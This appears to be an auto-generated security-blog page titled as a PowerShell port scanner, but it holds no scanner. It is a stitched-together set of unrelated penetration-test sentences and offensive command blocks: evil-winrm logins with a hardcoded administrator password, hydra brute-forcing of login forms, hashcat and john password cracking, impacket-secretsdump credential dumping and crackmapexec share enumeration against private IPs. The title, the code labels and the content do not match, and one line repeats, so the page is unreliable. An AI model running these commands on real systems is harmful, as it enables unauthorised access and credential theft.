---
TitleSEO: "Automated Port Scanner in PowerShell | ZureFX"
TitlePost: "Automated Port Scanner — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for automated port scanner. Built for security research and automation."
Keywords: "bash, c, fuzzer, powershell"
URL: "https://zurefx.github.io/scripting/script-automated-port-scanner-881.html"
URL_IMAGES: ""
Date: "2025-05-03"
Tags: "Bash, C, Fuzzer, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-automated-port-scanner-881"
Permalink: "/scripting/script-automated-port-scanner-881.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Unconstrained delegation was enabled on the compromised machine. Command injection was possible through unsanitized user input in the search functionality. Token impersonation allowed elevation to SYSTEM privileges on the target.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `atexec`
- `hydra`
- `kerbrute`

## Implementation

### Core Logic

The backup files contained sensitive information that should not have been accessible. The target system was identified as running a vulnerable version of the service.

```powershell
evil-winrm -i 10.11.99.42 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.76.151.35/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.63.103.110 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Helper Functions

Post-exploitation enumeration revealed a path to domain administrator privileges. Initial enumeration revealed several interesting open ports on the target.

```powershell
nmap -sCV -p5986,1433,23 10.102.187.249 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.18.133.51 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Usage

### Basic Usage

The database credentials were hardcoded in the application source code. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.78.89.23
```

### Advanced Options

Token impersonation allowed elevation to SYSTEM privileges on the target. Weak file permissions allowed modification of critical system files. The service account had excessive permissions assigned in Active Directory.

```bash
feroxbuster -h
crackmapexec smb 10.33.252.82 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

The application stored sensitive credentials in an unencrypted configuration file. Lateral movement was facilitated by reusing discovered credentials across services.

```
[+] Scanning target...
[+] Found 11 results
[+] Done in 0.55s
```
